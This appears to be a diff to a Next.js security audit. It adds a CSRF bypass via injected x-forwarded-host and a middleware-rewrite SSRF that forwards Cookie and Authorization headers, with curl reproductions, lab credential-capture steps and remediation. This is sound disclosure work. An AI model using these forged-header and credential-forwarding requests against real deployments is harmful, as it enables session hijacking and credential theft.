@@ -2,7 +2,7 @@
 
 ## Executive Summary
 
-This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Six issues were identified and confirmed against live instances in a Docker-based test environment:
+This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Eight issues were identified and confirmed against live instances in a Docker-based test environment:
 
 | ID | Title | Severity |
 |----|-------|----------|
@@ -12,8 +12,10 @@ This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v
 | VULN-4 | Arbitrary File Read via Source Map Endpoint (webpack dev server) | High |
 | VULN-5 | Unauthenticated V8 Inspector Open via Dev Endpoint | High |
 | VULN-6 | Path Traversal in launch-editor via isAppRelativePath | Medium |
+| VULN-7 | Server Action CSRF Bypass via x-forwarded-host Header Injection | High |
+| VULN-8 | Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts | High |
 
-All six vulnerabilities are independently reproducible using the provided exploit scripts.
+All eight vulnerabilities are independently reproducible using the provided exploit scripts.
 
 ---
 
@@ -376,6 +378,143 @@ After computing `appPath`, validate that `path.resolve(nextRootDirectory, appPat
 
 ---
 
+## VULN-7: Server Action CSRF Bypass via x-forwarded-host Header Injection
+
+**Severity:** High
+
+**Affected Code:**
+- `packages/next/src/server/app-render/action-handler.ts:482-518` — `parseHostHeader`: when called without `originDomain`, unconditionally returns `x-forwarded-host` value if present, prioritizing it over the `host` header
+- `packages/next/src/server/app-render/action-handler.ts:635,652` — CSRF check calls `parseHostHeader(req.headers)` (without `originDomain`) and compares `originHost` against the returned value
+- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `INTERNAL_HEADERS` list does not include `x-forwarded-host`, so it is never stripped by `filterInternalHeaders`
+
+**Root Cause:**
+
+The CSRF check for Server Actions compares the `origin` header's host against the value returned by `parseHostHeader(req.headers)`. The `parseHostHeader` function, when called without the optional `originDomain` parameter (as it is at line 635), returns `x-forwarded-host` unconditionally if that header is present, falling back to `host` only if `x-forwarded-host` is absent.
+
+The `filterInternalHeaders` function in `server-ipc/utils.ts` strips headers in the `INTERNAL_HEADERS` list from incoming requests before processing. `x-forwarded-host` is not in this list. An external attacker can therefore inject `x-forwarded-host` with an arbitrary value.
+
+Attack: send `Origin: https://evil.com` (sets `originHost = "evil.com"`) together with `x-forwarded-host: evil.com` (sets `host.value = "evil.com"` via `parseHostHeader`). The CSRF check `originHost === host.value` evaluates `"evil.com" === "evil.com"` — match passes. The action executes.
+
+**Note:** `parseHostHeader` has an `originDomain` parameter (lines 493-504) designed to constrain which host values can be returned. However, the actual CSRF check at line 635 never passes `originDomain`. The defense exists in code but is not wired up.
+
+**Precondition:** Next.js must be directly internet-facing without an upstream proxy that rewrites or removes `x-forwarded-host`. Deployments behind Nginx, Cloudflare, or a load balancer that sets `x-forwarded-host` to the actual client hostname are NOT affected — the proxy's value overwrites the attacker's.
+
+**Browser mitigation note:** Modern browsers default to `SameSite=Lax` for cookies, which prevents cross-site POST requests from including cookies. This mitigates the browser-based CSRF vector for cookies without explicit `SameSite=None`. However, the bypass remains exploitable for: (1) applications that set `SameSite=None` on session cookies (common for cross-site embedding or OAuth flows), (2) non-browser attack scenarios (compromised proxies, network intermediaries, or scripted requests with stolen credentials), and (3) any deployment where cookies are explicitly configured as `SameSite=None; Secure`.
+
+**Attack Scenario:**
+
+A Next.js application is deployed directly on a cloud VM without a reverse proxy. A cross-origin attacker wants to invoke a Server Action (e.g., a privileged mutation) on behalf of a victim user. Normal CSRF protection rejects requests where `Origin` does not match `host`. The attacker sends:
+
+```
+Origin: https://evil.com
+x-forwarded-host: evil.com
+```
+
+The CSRF check passes. The attacker invokes the Server Action with the victim's session cookie (obtained via a separate XSS or cookie-stealing attack), executing the privileged operation.
+
+**Reproduction Steps:**
+
+```bash
+# Extract 42-char action ID from manifest
+ACTION_ID=$(docker exec audit-nextjs-app \
+  cat /app/.next/server/server-reference-manifest.json \
+  | grep -oE '[0-9a-f]{42}' | head -1)
+
+# Negative control — mismatched Origin, no x-forwarded-host (should be rejected)
+NEG_STATUS=$(curl -s -o /tmp/neg_body.txt -w '%{http_code}' -X POST \
+  -H "Next-Action: $ACTION_ID" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  -H "Cookie: session=victim_csrf_token" \
+  -H "Origin: https://evil.com" \
+  --data '[]' \
+  'http://localhost:3000/')
+# Expected: non-200 status, OR body contains "Invalid Server Actions request"
+
+# Positive exploit — Origin: https://evil.com + x-forwarded-host: evil.com (should bypass)
+curl -s -X POST \
+  -H "Next-Action: $ACTION_ID" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  -H "Cookie: session=victim_csrf_token" \
+  -H "Origin: https://evil.com" \
+  -H "x-forwarded-host: evil.com" \
+  --data '[]' \
+  'http://localhost:3000/'
+# Expected: HTTP 200, no "Invalid Server Actions request" in body
+```
+
+**Evidence:**
+- Without `x-forwarded-host`: request rejected (non-200 status or CSRF error body) — baseline protection confirmed
+- With `x-forwarded-host: evil.com`: request returns HTTP 200 without CSRF error — bypass confirmed
+- `INTERNAL_HEADERS` in `utils.ts:42-54` does not include `x-forwarded-host` — header passes unstripped
+
+**Remediation:**
+
+Option 1: Add `x-forwarded-host` to the `INTERNAL_HEADERS` list in `server-ipc/utils.ts`. This strips the header for all external requests, preventing injection. Deployments that legitimately rely on `x-forwarded-host` would need to configure trust explicitly.
+
+Option 2: Wire the `originDomain` parameter at `action-handler.ts:635`: change `parseHostHeader(req.headers)` to `parseHostHeader(req.headers, originHost)`. This makes the function return a value only if it matches the origin, regardless of which header provides it.
+
+Option 3: Add a `serverActions.trustXForwardedHost` config flag (defaulting to `false`) that controls whether `x-forwarded-host` is trusted for CSRF checking, similar to the `trustHost` pattern used in other frameworks.
+
+---
+
+## VULN-8: Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts
+
+**Severity:** High
+
+**Affected Code:**
+- `packages/next/src/server/lib/router-utils/proxy-request.ts:25-36` — `proxyRequest`: creates `http-proxy` instance with `changeOrigin: true`; `http-proxy` forwards all original request headers (including `Cookie` and `Authorization`) to the target by default
+- `packages/next/src/server/lib/router-server.ts:499-508` — calls `proxyRequest(req, res, parsedUrl, ...)` when middleware rewrite destination has a protocol (cross-origin), with no host validation
+- `packages/next/src/server/lib/router-utils/resolve-routes.ts:726-739` — when `x-middleware-rewrite` contains a cross-origin URL, returns `{finished: true, parsedUrl}` with the full external URL preserved in `parsedUrl`
+- `packages/next/src/server/web/utils.ts:141-152` — `validateURL`: validates only that the rewrite destination is a parseable absolute URL; performs no host allowlist check
+
+**Root Cause:**
+
+`NextResponse.rewrite(destination)` sets the `x-middleware-rewrite` response header to the destination URL. When the destination is on a different origin than the application (different host or protocol), `resolve-routes.ts` returns `finished: true` with the full external URL. `router-server.ts` then calls `proxyRequest`, which uses `http-proxy` to forward the original request — including ALL headers — to the external target.
+
+There is no host allowlist or validation for rewrite destinations at any point in this pipeline. Any URL that passes `new URL()` parsing is accepted. Crucially, `http-proxy` forwards the `Cookie` and `Authorization` headers from the original client request to the attacker-controlled destination.
+
+This means that a middleware reading any user-controlled value (query parameter, header, path segment) and using it as a rewrite destination enables SSRF with full credential forwarding.
+
+**Attack Scenario:**
+
+A Next.js application uses middleware to route to different backends based on a query parameter (a common pattern for multi-tenant routing, A/B testing, or locale-based backends). An attacker sends a request to the application with a crafted `?backend=` parameter pointing to an attacker-controlled server. The middleware rewrites to the attacker's server. The `proxyRequest` call forwards the victim user's `Cookie` and `Authorization` headers to the attacker's server, leaking credentials.
+
+In a realistic scenario: a victim user visits `https://app.example.com/?backend=https://attacker.com/steal` (e.g., via a phishing link or injected URL). The middleware rewrites the request to `attacker.com/steal`, forwarding the victim's session cookie. The attacker logs the cookie and takes over the session.
+
+**Reproduction Steps:**
+
+```bash
+# Negative control — normal request returns the app page
+curl -s 'http://localhost:3003/'
+# Expected: HTTP 200 with "Middleware Audit App" in body
+
+# Positive exploit — rewrite to attacker-controlled server with victim credentials
+curl -s \
+  -H "Cookie: session=VICTIM_SECRET_TOKEN_12345" \
+  -H "Authorization: Bearer sk-secret-api-key-67890" \
+  'http://localhost:3003/?backend=http://audit-credential-capture:9091/steal'
+# Expected: HTTP 200 (proxy completed successfully)
+
+# Verify credentials were captured by attacker server
+docker logs audit-credential-capture 2>&1 | grep CREDENTIAL_CAPTURED
+# Expected: lines containing VICTIM_SECRET_TOKEN_12345 and sk-secret-api-key-67890
+```
+
+**Evidence:**
+- Normal request (`GET /`) returns HTTP 200 with app page — app running correctly
+- Exploit request with `?backend=http://audit-credential-capture:9091/steal` returns HTTP 200
+- `docker logs audit-credential-capture` shows `CREDENTIAL_CAPTURED: cookie=session=VICTIM_SECRET_TOKEN_12345` and `CREDENTIAL_CAPTURED: authorization=Bearer sk-secret-api-key-67890`
+
+**Remediation:**
+
+Option 1: Strip credential headers (`Cookie`, `Authorization`, `X-Auth-*`) before proxying to cross-origin rewrite destinations in `proxy-request.ts`. Credentials should only be forwarded to the application's own origin.
+
+Option 2: Add a `rewrites.allowedExternalHosts` config option (analogous to `images.remotePatterns`) that restricts which external hosts middleware may rewrite to. Reject rewrites to hosts not in the allowlist.
+
+Option 3: Document the credential-forwarding behavior prominently in the `NextResponse.rewrite()` documentation, so developers using user-controlled values as rewrite destinations understand the risk. This is a mitigation, not a fix.
+
+---
+
 ## Appendix: Test Environment
 
 ```
@@ -384,8 +523,10 @@ audit-net (Docker bridge network)
   +-- audit-nextjs-app (3000:3000) — next start, production mode
   +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
   +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack, NODE_OPTIONS=--inspect=0.0.0.0:9229
+  +-- audit-middleware-app (3003:3000) — next start, production mode, middleware SSRF target
   +-- audit-redirect-server (8080:8080) — issues 302 redirect to secret server
   +-- audit-secret-server (9090:9090) — serves JPEG, logs access
+  +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
 ```
 
 To reproduce all findings:
